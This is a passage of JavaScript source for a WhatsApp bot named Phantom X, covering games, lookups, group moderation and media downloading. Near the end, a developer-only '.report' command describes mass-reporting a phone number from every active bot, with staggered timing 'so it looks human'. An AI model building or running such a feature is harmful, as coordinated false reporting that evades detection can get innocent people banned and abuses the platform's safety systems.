                }
                if (parts[1]?.toLowerCase() === "skip") { delete triviaState[from]; return reply("⏭️ Question skipped!"); }
                const tq = TRIVIA_QUESTIONS[Math.floor(Math.random() * TRIVIA_QUESTIONS.length)];
                triviaState[from] = tq;
                await reply(`🧠 *TRIVIA TIME!*\n\n❓ *${tq.q}*\n\n💡 Hint: ${tq.hint}\n\nType *.trivia <your answer>*`);
                break;
            }

            // --- HANGMAN ---
            case ".hangman": {
                const HANG = ["⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n⬜🟧⬜⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧⬜⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧🟩⬜⬜\n⬜⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧🟩⬜⬜\n🟦⬜⬜⬜⬜","⬜⬜⬜⬜⬜\n⬜🟥⬜⬜⬜\n🟨🟧🟩⬜⬜\n🟦🟪⬜⬜⬜","💀 DEAD"];
                if (!hangmanState[from] || parts[1]?.toLowerCase() === "start" || parts[1]?.toLowerCase() === "new") {
                    const word = HANGMAN_WORDS[Math.floor(Math.random() * HANGMAN_WORDS.length)];
                    hangmanState[from] = { word, guessed: [], wrong: 0 };
                    const display = word.split("").map(l => "_").join(" ");
                    return reply(`🎯 *HANGMAN!*\n\nWord: *${display}*\nWrong guesses: 0/6\n\n${HANG[0]}\n\nType *.hangman <letter>* to guess!`);
                }
                if (parts[1]?.toLowerCase() === "stop") { delete hangmanState[from]; return reply("🛑 Hangman stopped."); }
                const hState = hangmanState[from];
                const letter = parts[1]?.toLowerCase().replace(/[^a-z]/g,"");
                if (!letter || letter.length !== 1) return reply("Type *.hangman <single letter>* to guess, or *.hangman new* to start.");
                if (hState.guessed.includes(letter)) return reply(`⚠️ You already guessed *${letter}*! Try a different letter.`);
                hState.guessed.push(letter);
                if (!hState.word.includes(letter)) hState.wrong++;
                const display = hState.word.split("").map(l => hState.guessed.includes(l) ? l.toUpperCase() : "_").join(" ");
                const isWon = hState.word.split("").every(l => hState.guessed.includes(l));
                const isLost = hState.wrong >= 6;
                if (isWon) { delete hangmanState[from]; return reply(`🎉 *YOU WIN!*\n\nWord: *${hState.word.toUpperCase()}*\n\nCongratulations! Type *.hangman new* to play again.`); }
                if (isLost) { delete hangmanState[from]; return reply(`💀 *GAME OVER!*\n\nThe word was: *${hState.word.toUpperCase()}*\n\n${HANG[6]}\n\nType *.hangman new* to try again.`); }
                await reply(`🎯 *HANGMAN*\n\nWord: *${display}*\nGuessed: ${hState.guessed.join(", ")}\nWrong: ${hState.wrong}/6\n\n${HANG[hState.wrong]}`);
                break;
            }

            // --- NUMBER GUESSING GAME ---
            case ".numguess": {
                if (numGuessState[from]) {
                    const ng = numGuessState[from];
                    const guess = parseInt(parts[1]);
                    if (isNaN(guess)) return reply(`🔢 *Number Guess Active!*\n\nGuess a number between *1 and 100*.\nAttempts used: *${ng.attempts}*\nType *.numguess <number>*`);
                    ng.attempts++;
                    if (guess === ng.number) {
                        delete numGuessState[from];
                        return reply(`🎉 *CORRECT!* The number was *${ng.number}*!\n\nYou got it in *${ng.attempts} attempt${ng.attempts > 1 ? "s" : ""}*! ${ng.attempts <= 5 ? "🏆 Impressive!" : ng.attempts <= 10 ? "👍 Nice!" : "Keep practicing!"}`);
                    }
                    const hint = guess < ng.number ? "📈 Too low! Go higher." : "📉 Too high! Go lower.";
                    return reply(`${hint}\n\nAttempts: *${ng.attempts}*\nType *.numguess <number>* to keep guessing.\nGive up? *.numguess stop*`);
                }
                if (parts[1]?.toLowerCase() === "stop") { delete numGuessState[from]; return reply("🛑 Number guess game ended."); }
                const secret = Math.floor(Math.random() * 100) + 1;
                numGuessState[from] = { number: secret, attempts: 0 };
                await reply(`🔢 *NUMBER GUESS GAME!*\n\nI'm thinking of a number between *1 and 100*.\nCan you guess it?\n\nType *.numguess <number>* to guess!\nType *.numguess stop* to give up.`);
                break;
            }

            // --- RIDDLE ---
            case ".riddle": {
                if (triviaState[`riddle_${from}`]) {
                    const r = triviaState[`riddle_${from}`];
                    const ans = parts.slice(1).join(" ").trim().toLowerCase();
                    if (parts[1]?.toLowerCase() === "skip") {
                        delete triviaState[`riddle_${from}`];
                        return reply(`⏭️ Skipped! The answer was: *${r.a}*`);
                    }
                    if (!ans) return reply(`🧩 *Current Riddle:*\n\n_${r.q}_\n\n💡 Hint: ${r.hint}\n\nType *.riddle <answer>* or *.riddle skip*`);
                    if (ans === r.a) {
                        delete triviaState[`riddle_${from}`];
                        return reply(`✅ *CORRECT!* 🎉\n\nThe answer was: *${r.a}*\n\nWell done! Try *.riddle* for another one.`);
                    }
                    return reply(`❌ Wrong! Try again.\n💡 Hint: ${r.hint}\n\nType *.riddle <answer>* or *.riddle skip* to give up.`);
                }
                const rd = RIDDLES[Math.floor(Math.random() * RIDDLES.length)];
                triviaState[`riddle_${from}`] = rd;
                await reply(`🧩 *RIDDLE TIME!*\n\n_${rd.q}_\n\n💡 Hint: ${rd.hint}\n\nType *.riddle <your answer>* to answer!`);
                break;
            }

            // --- MATH QUIZ ---
            case ".mathquiz": {
                const ops = ["+", "-", "*"];
                const op = ops[Math.floor(Math.random() * 3)];
                const a = Math.floor(Math.random() * (op === "*" ? 12 : 50)) + 1;
                const b = Math.floor(Math.random() * (op === "*" ? 12 : 50)) + 1;
                const ans = op === "+" ? a + b : op === "-" ? a - b : a * b;
                const opName = op === "+" ? "plus" : op === "-" ? "minus" : "times";
                await reply(`🧮 *MATH QUIZ!*\n\nWhat is *${a} ${op} ${b}*?\n\n_(${a} ${opName} ${b})_\n\nType your answer — first correct reply wins!\n⚡ _Answer: ||${ans}||_`);
                break;
            }

            // --- WOULD YOU RATHER ---
            case ".wouldurather":
            case ".wyr": {
                const wyr = WOULD_U_RATHER[Math.floor(Math.random() * WOULD_U_RATHER.length)];
                const [optA, optB] = wyr.split(" OR ");
                await reply(`🤔 *WOULD YOU RATHER?*\n\n${wyr}\n\n*A)* ${optA.replace("Would you rather ", "").trim()}\n*B)* ${optB?.trim() || "..."}\n\nReply A or B! 👇`);
                break;
            }

            // --- WORD SCRAMBLE ---
            case ".scramble": {
                if (scrambleState[from]) {
                    const sc = scrambleState[from];
                    const ans = parts.slice(1).join(" ").trim().toLowerCase();
                    if (parts[1]?.toLowerCase() === "skip") {
                        delete scrambleState[from];
                        return reply(`⏭️ Skipped! The word was: *${sc.word.toUpperCase()}*`);
                    }
                    if (!ans) return reply(`🔀 *Scrambled:* *${sc.scrambled}*\n\n💡 ${sc.hint}\n\nType *.scramble <answer>* or *.scramble skip*`);
                    if (ans === sc.word) {
                        delete scrambleState[from];
                        return reply(`✅ *CORRECT!* 🎉\n\nThe word was: *${sc.word.toUpperCase()}*\n\nWell unscrambled! Try *.scramble* for another.`);
                    }
                    return reply(`❌ Wrong! Try again.\n🔀 Scrambled: *${sc.scrambled}*\n💡 ${sc.hint}\n\nType *.scramble <answer>* or *.scramble skip*`);
                }
                const sw = SCRAMBLE_WORDS[Math.floor(Math.random() * SCRAMBLE_WORDS.length)];
                const scrambled = sw.word.split("").sort(() => Math.random() - 0.5).join("").toUpperCase();
                scrambleState[from] = { word: sw.word, scrambled, hint: sw.hint };
                await reply(`🔀 *WORD SCRAMBLE!*\n\nUnscramble this word:\n\n*${scrambled}*\n\n💡 Hint: ${sw.hint}\n\nType *.scramble <your answer>*\nGive up? *.scramble skip*`);
                break;
            }

            // --- HOROSCOPE ---
            case ".horoscope": {
                const sign = parts[1]?.toLowerCase().trim();
                const signs = Object.keys(HOROSCOPES);
                if (!sign || !HOROSCOPES[sign]) {
                    return reply(`♈ *HOROSCOPE*\n\nType *.horoscope <sign>*\n\nAvailable signs:\n${signs.map(s => `• ${s}`).join("\n")}`);
                }
                await reply(`✨ *Daily Horoscope*\n\n${HOROSCOPES[sign]}\n\n_✨ Phantom X Horoscope — ${new Date().toDateString()}_`);
                break;
            }

            // --- SHIP (love calculator) ---
            case ".ship": {
                const shipMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (shipMentioned.length < 2) {
                    const names = parts.slice(1).join(" ").split("&").map(n => n.trim());
                    if (names.length < 2 || !names[1]) return reply("Usage: .ship @person1 @person2\nOr: .ship Name1 & Name2");
                    const pct = Math.floor(Math.random() * 101);
                    const bar = "❤️".repeat(Math.floor(pct / 10)) + "🤍".repeat(10 - Math.floor(pct / 10));
                    const msg2 = pct >= 80 ? "💍 Soulmates!" : pct >= 60 ? "💕 Great match!" : pct >= 40 ? "🙂 Could work!" : pct >= 20 ? "😬 Needs effort..." : "💔 Not compatible!";
                    return reply(`💘 *SHIP CALCULATOR*\n\n${names[0]} ❤️ ${names[1]}\n\n${bar}\n*${pct}% compatible*\n\n${msg2}`);
                }
                const n1 = `@${shipMentioned[0].split("@")[0]}`;
                const n2 = `@${shipMentioned[1].split("@")[0]}`;
                const pct = Math.floor(Math.random() * 101);
                const bar = "❤️".repeat(Math.floor(pct / 10)) + "🤍".repeat(10 - Math.floor(pct / 10));
                const result = pct >= 80 ? "💍 Soulmates!" : pct >= 60 ? "💕 Great match!" : pct >= 40 ? "🙂 Could work!" : pct >= 20 ? "😬 Needs effort..." : "💔 Not compatible!";
                await sock.sendMessage(from, { text: `💘 *SHIP CALCULATOR*\n\n${n1} ❤️ ${n2}\n\n${bar}\n*${pct}% compatible*\n\n${result}`, mentions: shipMentioned }, { quoted: msg });
                break;
            }

            // --- RATE (random rate out of 100) ---
            case ".rate": {
                const rateMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const rateName = rateMentioned.length ? `@${rateMentioned[0].split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
                const rate = Math.floor(Math.random() * 101);
                const bar = "🟩".repeat(Math.floor(rate / 10)) + "⬜".repeat(10 - Math.floor(rate / 10));
                const rateMsg = rate >= 90 ? "🏆 Absolutely elite!" : rate >= 70 ? "🔥 Very impressive!" : rate >= 50 ? "👍 Above average!" : rate >= 30 ? "😐 Room to grow." : "💀 Rough day...";
                await sock.sendMessage(from, { text: `📊 *RATE*\n\n${rateName} rated:\n\n${bar}\n*${rate}/100*\n\n${rateMsg}`, mentions: rateMentioned }, { quoted: msg });
                break;
            }

            // --- VIBE CHECK ---
            case ".vibe": {
                const vibes = ["☀️ Immaculate vibes — you're radiating today!", "🔥 On fire! The energy is unmatched.", "💜 Calm, cool, collected. Major main character energy.", "🌊 Chill vibes only. You're in your element.", "😤 Slightly off today but still dangerous.", "🌧️ Cloudy vibes. Take a breather.", "⚡ Electric! People feel your presence.", "🫥 Invisible mode activated. Might be plotting something.", "🤡 Chaotic vibes. Wild but entertaining.", "👑 Royal vibes. No further questions."];
                const vibeMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const vibeName = vibeMentioned.length ? `@${vibeMentioned[0].split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
                const vibe = vibes[Math.floor(Math.random() * vibes.length)];
                await sock.sendMessage(from, { text: `✨ *VIBE CHECK*\n\n${vibeName}\n\n${vibe}`, mentions: vibeMentioned }, { quoted: msg });
                break;
            }

            // --- JOKE ---
            case ".joke": {
                await reply(`😂 *Random Joke*\n\n${JOKES[Math.floor(Math.random() * JOKES.length)]}`);
                break;
            }

            // --- FACT ---
            case ".fact": {
                await reply(`📚 *Fun Fact*\n\n${FACTS[Math.floor(Math.random() * FACTS.length)]}`);
                break;
            }

            // --- QUOTE ---
            case ".quote": {
                await reply(`✨ *Quote of the Moment*\n\n${QUOTES[Math.floor(Math.random() * QUOTES.length)]}`);
                break;
            }

            // --- ROAST ---
            case ".roast": {
                const roastTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                const name = roastTarget ? `@${roastTarget.split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
                const roast = ROASTS[Math.floor(Math.random() * ROASTS.length)];
                await sock.sendMessage(from, { text: `🔥 *Roast for ${name}:*\n\n${roast}`, mentions: roastTarget ? [roastTarget] : [] }, { quoted: msg });
                break;
            }

            // --- COMPLIMENT ---
            case ".compliment": {
                const compTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                const cname = compTarget ? `@${compTarget.split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
                const comp = COMPLIMENTS[Math.floor(Math.random() * COMPLIMENTS.length)];
                await sock.sendMessage(from, { text: `💛 *Compliment for ${cname}:*\n\n${comp}`, mentions: compTarget ? [compTarget] : [] }, { quoted: msg });
                break;
            }

            // --- TRANSLATE (MyMemory free API) ---
            case ".translate":
            case ".tr": {
                const trParts = parts.slice(1);
                if (trParts.length < 2) return reply(
                    "Usage: .translate <lang_code> <text>\n\n" +
                    "Example: .translate fr Good morning everyone\n\n" +
                    "Common language codes:\n" +
                    "• fr — French\n• es — Spanish\n• de — German\n• ar — Arabic\n" +
                    "• zh — Chinese\n• pt — Portuguese\n• ru — Russian\n• ja — Japanese\n" +
                    "• yo — Yoruba\n• ha — Hausa\n• sw — Swahili\n• ig — Igbo\n\n" +
                    "_Tip: You can also use full language names like 'french'_"
                );
                const toLang = trParts[0].toLowerCase();
                const trText = trParts.slice(1).join(" ");
                await reply(`🌐 Translating to *${toLang}*...`);
                try {
                    const encoded = encodeURIComponent(trText);
                    const trResult = await new Promise((resolve, reject) => {
                        https.get(`https://api.mymemory.translated.net/get?q=${encoded}&langpair=en|${toLang}`, (res) => {
                            let data = ""; res.on("data", c => data += c); res.on("end", () => {
                                try {
                                    const p = JSON.parse(data);
                                    const translated = p.responseData?.translatedText || "";
                                    if (!translated || p.responseStatus === 400 || translated.toLowerCase().includes("invalid")) {
                                        reject(new Error(`Language code '${toLang}' not recognized. Use a valid ISO code like fr, es, ar, yo, ha.`));
                                    } else {
                                        resolve(translated);
                                    }
                                } catch { reject(new Error("Parse error")); }
                            });
                        }).on("error", reject);
                    });
                    await reply(`🌐 *Translation (${toLang}):*\n\n_${trText}_\n\n➡️ *${trResult}*`);
                } catch (e) { await reply(`❌ Translation failed: ${e?.message}`); }
                break;
            }

            // --- WEATHER (wttr.in free API) ---
            case ".weather":
            case ".wx": {
                const city = parts.slice(1).join(" ").trim();
                if (!city) return reply("Usage: .weather Lagos\nExample: .weather Abuja");
                await reply(`🌤️ Fetching weather for *${city}*...`);
                try {
                    const wxResult = await new Promise((resolve, reject) => {
                        https.get(`https://wttr.in/${encodeURIComponent(city)}?format=4`, (res) => {
                            let data = ""; res.on("data", c => data += c); res.on("end", () => resolve(data.trim()));
                        }).on("error", reject);
                    });
                    await reply(`🌍 *Weather: ${city}*\n\n${wxResult}\n\n_Powered by wttr.in_`);
                } catch (e) { await reply(`❌ Weather fetch failed: ${e?.message}`); }
                break;
            }

            // --- BIBLE (bible-api.com free) ---
            case ".bible": {
                const bRef = parts.slice(1).join(" ").trim();
                const bQuery = bRef || "john 3:16";
                await reply(`📖 Fetching *${bQuery}*...`);
                try {
                    const bVerse = await new Promise((resolve, reject) => {
                        https.get(`https://bible-api.com/${encodeURIComponent(bQuery)}`, (res) => {
                            let data = ""; res.on("data", c => data += c); res.on("end", () => {
                                try { const p = JSON.parse(data); resolve(p.text ? { ref: p.reference, text: p.text.trim() } : null); } catch { reject(new Error("Parse")); }
                            });
                        }).on("error", reject);
                    });
                    if (!bVerse) return reply("❌ Verse not found. Example: .bible John 3:16");
                    await reply(`📖 *${bVerse.ref}*\n\n_"${bVerse.text}"_\n\n_— Holy Bible (KJV)_`);
                } catch (e) { await reply(`❌ Bible fetch failed: ${e?.message}`); }
                break;
            }

            // --- QURAN (alquran.cloud free API) ---
            case ".quran": {
                const qInput = parts.slice(1).join(":").trim();
                const [surahStr, ayahStr] = qInput.split(":").map(s => s?.trim());
                const surah = parseInt(surahStr) || 1;
                const ayah = parseInt(ayahStr) || 1;
                await reply(`📗 Fetching Surah *${surah}*, Ayah *${ayah}*...`);
                try {
                    const [arResult, enResult] = await Promise.all([
                        new Promise((resolve, reject) => {
                            https.get(`https://api.alquran.cloud/v1/ayah/${surah}:${ayah}`, (res) => {
                                let data = ""; res.on("data", c => data += c); res.on("end", () => {
                                    try { const p = JSON.parse(data); resolve(p.data || null); } catch { reject(new Error("Parse")); }
                                });
                            }).on("error", reject);
                        }),
                        new Promise((resolve, reject) => {
                            https.get(`https://api.alquran.cloud/v1/ayah/${surah}:${ayah}/en.asad`, (res) => {
                                let data = ""; res.on("data", c => data += c); res.on("end", () => {
                                    try { const p = JSON.parse(data); resolve(p.data || null); } catch { reject(new Error("Parse")); }
                                });
                            }).on("error", reject);
                        }),
                    ]);
                    if (!arResult) return reply("❌ Ayah not found. Example: .quran 2:255");
                    const surahName = arResult.surah?.englishName || `Surah ${surah}`;
                    await reply(`📗 *${surahName} — Ayah ${ayah}*\n\n*Arabic:*\n${arResult.text}\n\n*English:*\n_"${enResult?.text || "Translation unavailable."}"_`);
                } catch (e) { await reply(`❌ Quran fetch failed: ${e?.message}`); }
                break;
            }

            // --- GROUP INFO ---
            case ".groupinfo": {
                if (!isGroup) return reply("❌ This command only works in groups.");
                try {
                    const meta = await sock.groupMetadata(from);
                    const admins = meta.participants.filter(p => p.admin);
                    const created = new Date(meta.creation * 1000).toLocaleDateString("en-NG");
                    await reply(
                        `👥 *GROUP INFO*\n━━━━━━━━━━━━━━━━━━━\n\n` +
                        `📌 *Name:* ${meta.subject}\n` +
                        `🆔 *ID:* ${from}\n` +
                        `👤 *Members:* ${meta.participants.length}\n` +
                        `🛡️ *Admins:* ${admins.length}\n` +
                        `📅 *Created:* ${created}\n` +
                        `📝 *Description:*\n_${meta.desc || "No description"}_`
                    );
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- ADMIN LIST ---
            case ".adminlist": {
                if (!isGroup) return reply("❌ This command only works in groups.");
                try {
                    const meta = await sock.groupMetadata(from);
                    const admins = meta.participants.filter(p => p.admin);
                    if (!admins.length) return reply("No admins found.");
                    let txt = `🛡️ *Admin List — ${meta.subject}*\n━━━━━━━━━━━━━━━━━━━\n\n`;
                    admins.forEach((a, i) => { txt += `${i+1}. @${a.id.split("@")[0]} ${a.admin === "superadmin" ? "👑" : "🛡️"}\n`; });
                    await sock.sendMessage(from, { text: txt, mentions: admins.map(a => a.id) }, { quoted: msg });
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- MEMBER COUNT ---
            case ".membercount": {
                if (!isGroup) return reply("❌ This command only works in groups.");
                try {
                    const meta = await sock.groupMetadata(from);
                    await reply(`👥 *Member Count:* *${meta.participants.length}* members in *${meta.subject}*`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- EVERYONE (tag all members) ---
            case ".everyone":
            case ".all": {
                if (!isGroup) return reply("❌ This command only works in groups.");
                const evMsg = parts.slice(1).join(" ").trim() || "📢 *Attention everyone!*";
                try {
                    const meta = await sock.groupMetadata(from);
                    const members = meta.participants.map(p => p.id);
                    const mentionText = members.map(j => `@${j.split("@")[0]}`).join(" ");
                    await sock.sendMessage(from, { text: `${evMsg}\n\n${mentionText}`, mentions: members }, { quoted: msg });
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- SET STATUS (WhatsApp about) ---
            case ".setstatus": {
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can use this.");
                const statusText = parts.slice(1).join(" ").trim();
                if (!statusText) return reply("Usage: .setstatus <your new status>");
                try {
                    await sock.updateProfileStatus(statusText);
                    await reply(`✅ Status updated to:\n_${statusText}_`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- SET NAME (WhatsApp display name) ---
            case ".setname": {
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can use this.");
                const newName = parts.slice(1).join(" ").trim();
                if (!newName) return reply("Usage: .setname <new name>");
                try {
                    await sock.updateProfileName(newName);
                    await reply(`✅ Display name updated to: *${newName}*`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // --- WARN ---
            case ".warn": {
                if (!isGroup) return reply("❌ Only works in groups.");
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can warn members.");
                const warnTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                if (!warnTarget) return reply("Usage: .warn @user — Reply or tag someone.");
                const wCount = addWarn(from, warnTarget);
                if (wCount >= 3) {
                    resetWarns(from, warnTarget);
                    try { await sock.groupParticipantsUpdate(from, [warnTarget], "remove"); } catch (_) {}
                    await sock.sendMessage(from, { text: `🚫 @${warnTarget.split("@")[0]} has been *kicked* — 3 warnings reached!`, mentions: [warnTarget] }, { quoted: msg });
                } else {
                    await sock.sendMessage(from, { text: `⚠️ @${warnTarget.split("@")[0]} has been warned!\n\n⚠️ Warning *${wCount}/3* — 3 = kick.`, mentions: [warnTarget] }, { quoted: msg });
                }
                break;
            }

            // --- WARNLIST ---
            case ".warnlist": {
                if (!isGroup) return reply("❌ Only works in groups.");
                const warnData = getAllWarns(from);
                const entries = Object.entries(warnData).filter(([, v]) => v > 0);
                if (!entries.length) return reply("✅ No active warnings in this group.");
                let wTxt = `⚠️ *Warning List*\n━━━━━━━━━━━━━━━━━━━\n\n`;
                entries.forEach(([jid, count]) => { wTxt += `• @${jid.split("@")[0]}: *${count}/3* warns\n`; });
                await sock.sendMessage(from, { text: wTxt, mentions: entries.map(([j]) => j) }, { quoted: msg });
                break;
            }

            // --- RESETWARN ---
            case ".resetwarn": {
                if (!isGroup) return reply("❌ Only works in groups.");
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can reset warnings.");
                const rwTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                if (!rwTarget) return reply("Usage: .resetwarn @user");
                resetWarns(from, rwTarget);
                await sock.sendMessage(from, { text: `✅ Warnings cleared for @${rwTarget.split("@")[0]}!`, mentions: [rwTarget] }, { quoted: msg });
                break;
            }

            // --- BAN ---
            case ".ban": {
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can ban users.");
                const banTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                if (!banTarget) return reply("Usage: .ban @user — Tag the person to ban from the bot.");
                if (botJid) addBan(botJid, banTarget);
                await sock.sendMessage(from, { text: `🔴 @${banTarget.split("@")[0]} has been *banned* from using this bot.`, mentions: [banTarget] }, { quoted: msg });
                break;
            }

            // --- UNBAN ---
            case ".unban": {
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can unban users.");
                const unbanTarget = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                if (!unbanTarget) return reply("Usage: .unban @user");
                if (botJid) removeBan(botJid, unbanTarget);
                await sock.sendMessage(from, { text: `🟢 @${unbanTarget.split("@")[0]} has been *unbanned*.`, mentions: [unbanTarget] }, { quoted: msg });
                break;
            }

            // --- ANTIDELETE ---
            case ".antidelete": {
                if (!isGroup) return reply("❌ Only works in groups.");
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const adSub = parts[1]?.toLowerCase();
                if (adSub === "on") { setGroupSetting(from, "antidelete", true); return reply("✅ Anti-delete *ON* — Deleted messages will be re-sent."); }
                if (adSub === "off") { setGroupSetting(from, "antidelete", false); return reply("✅ Anti-delete *OFF*."); }
                return reply(`Usage: .antidelete on/off\nCurrent: *${getGroupSetting(from, "antidelete") ? "ON" : "OFF"}*`);
            }

            // --- ANTIBOT ---
            case ".antibot": {
                if (!isGroup) return reply("❌ Only works in groups.");
                const r = await getGroupRoles(sock, from);
                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply("❌ Group admins only.");
                const abSub = parts[1]?.toLowerCase();
                if (abSub === "on") {
                    setGroupSetting(from, "antibot", true);
                    if (!r.botIsAdmin) await reply("⚠️ Note: I'm not admin here, so I can't actually remove anyone.");
                    return reply("✅ Anti-bot *ON* — automated accounts (newsletters/broadcasts) will be removed.");
                }
                if (abSub === "off") { setGroupSetting(from, "antibot", false); return reply("✅ Anti-bot *OFF*."); }
                return reply(`Usage: .antibot on/off\nCurrent: *${getGroupSetting(from, "antibot") ? "ON" : "OFF"}*`);
            }

            // --- SCHEDULE ---
            case ".schedule": {
                if (!isGroup) return reply("❌ Only works in groups.");
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const schedTime = parts[1];
                const schedMsg = parts.slice(2).join(" ").trim();
                if (!schedTime || !schedMsg || !/^\d{2}:\d{2}$/.test(schedTime)) return reply("Usage: .schedule HH:MM <message>\nExample: .schedule 08:00 Good morning everyone!");
                const schedData = loadSchedules();
                if (!schedData[from]) schedData[from] = [];
                const exists = schedData[from].find(s => s.time === schedTime);
                if (exists) { exists.message = schedMsg; exists.botJid = botJid; }
                else { schedData[from].push({ time: schedTime, message: schedMsg, botJid }); }
                saveSchedules(schedData);
                await reply(`✅ Scheduled *${schedTime}* daily:\n_"${schedMsg}"_`);
                break;
            }

            case ".unschedule": {
                if (!isGroup) return reply("❌ Only works in groups.");
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const uTime = parts[1];
                if (!uTime) return reply("Usage: .unschedule HH:MM");
                const ud = loadSchedules();
                if (ud[from]) { ud[from] = ud[from].filter(s => s.time !== uTime); saveSchedules(ud); }
                await reply(`✅ Schedule at *${uTime}* removed.`);
                break;
            }

            case ".schedules": {
                if (!isGroup) return reply("❌ Only works in groups.");
                const sd = loadSchedules();
                const entries = sd[from] || [];
                if (!entries.length) return reply("📅 No active schedules for this group.");
                let sTxt = "📅 *Active Schedules*\n━━━━━━━━━━━━━━━━━━━\n\n";
                entries.forEach(s => { sTxt += `⏰ *${s.time}* — _"${s.message}"_\n`; });
                await reply(sTxt);
                break;
            }

            case ".dl":
            case ".yt": case ".ytdl": case ".ytmp4":
            case ".tiktok": case ".tt":
            case ".ig": case ".insta": case ".instagram":
            case ".fb": case ".facebook":
            case ".x": case ".twitter":
            case ".sc": case ".soundcloud":
            case ".pin": case ".pinterest":
            case ".reddit":
            case ".tumblr": case ".vimeo": case ".twitch":
            case ".ytmp3": case ".ytaudio": {
                const flags = parts.slice(1).filter(p => p.startsWith("--") || p === "audio");
                const urlArgs = parts.slice(1).filter(p => !p.startsWith("--") && p !== "audio");
                const url = urlArgs[0];
                if (!url || !/^https?:\/\//i.test(url)) return reply(`Usage: ${cmd} <url> [audio]\nExample: ${cmd} https://youtu.be/dQw4w9WgXcQ`);
                const audioCmds = [".ytmp3", ".ytaudio", ".sc", ".soundcloud"];
                const audio = audioCmds.includes(cmd) || flags.includes("audio") || flags.includes("--audio");
                await reply("⏳ _Cooking your media... give me a sec._");
                try {
                    const result = await downloadMedia(url, { audio });
                    const buf = await fetchBuffer(result.url);
                    const sizeMB = buf.length / 1024 / 1024;
                    if (sizeMB > 95) return reply(`❌ File too big (${sizeMB.toFixed(1)}MB). WhatsApp limit is ~100MB.\n\n_Try the audio version instead, or pick a shorter clip._`);
                    const caption = `✅ *${result.platform.toUpperCase()}* • via _${result.provider}_${result.title ? `\n\n📝 ${result.title}` : ""}\n\n_Powered by Phantom-X_`;
                    if (result.type === "audio") {
                        await sock.sendMessage(from, { audio: buf, mimetype: "audio/mp4" }, { quoted: msg });
                    } else if (result.type === "image") {
                        await sock.sendMessage(from, { image: buf, caption }, { quoted: msg });
                    } else {
                        await sock.sendMessage(from, { video: buf, caption }, { quoted: msg });
                    }
                } catch (e) {
                    await reply(`❌ *Download failed.*\n\n${e?.message || e}`);
                    if (e?.providerErrors) notifyOwnerDlFailure(sock, e.platform, url, e.providerErrors).catch(() => {});
                }
                break;
            }

            case ".dlhealth": {
                const data = loadDlHealth();
                const entries = Object.entries(data);
                if (!entries.length) return reply("📊 No download stats yet. Try `.dl <url>` first.");
                let txt = "📊 *Downloader Health*\n━━━━━━━━━━━━━━━━━━━\n\n";
                for (const [name, s] of entries) {
                    const total = s.ok + s.fail;
                    const rate = total ? Math.round((s.ok / total) * 100) : 0;
                    const emoji = rate >= 80 ? "🟢" : rate >= 40 ? "🟡" : "🔴";
                    const last = s.lastUsed ? `${Math.round((Date.now() - s.lastUsed) / 60000)}m ago` : "never";
                    txt += `${emoji} *${name}*\n   ✅ ${s.ok}  ❌ ${s.fail}  •  ${rate}% success\n   _last used: ${last}_\n`;
                    if (s.lastFailMsg && s.fail > 0) txt += `   ⚠️ _last err: ${s.lastFailMsg.slice(0, 80)}_\n`;
                    txt += "\n";
                }
                txt += `_Auto-fallback active. Owner is DM'd when all providers fail for a platform._`;
                await reply(txt);
                break;
            }

            // ════════════════════════════════════════
            // ░░░░░ THREAT NETWORK (DEV ONLY) ░░░░░
            // ════════════════════════════════════════
            case ".report": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const targetArg = parts[1];
                if (!targetArg) return reply(`🚨 *Threat Network — Mass Report*\n\nUsage:\n*.report <num> [category] [note]*\n\nCategories: ${REPORT_CATEGORIES.join(", ")}\nDefault category: scam\n\nThis blocks the number on EVERY active bot and submits a WhatsApp report from each, with 5-15s stagger so it looks human.`);
                const cleanNum = normalizeNum(targetArg);
                if (!cleanNum || cleanNum.length < 7) return reply("❌ Invalid number.");
                const cat = (parts[2] && REPORT_CATEGORIES.includes(parts[2].toLowerCase())) ? parts[2].toLowerCase() : "scam";
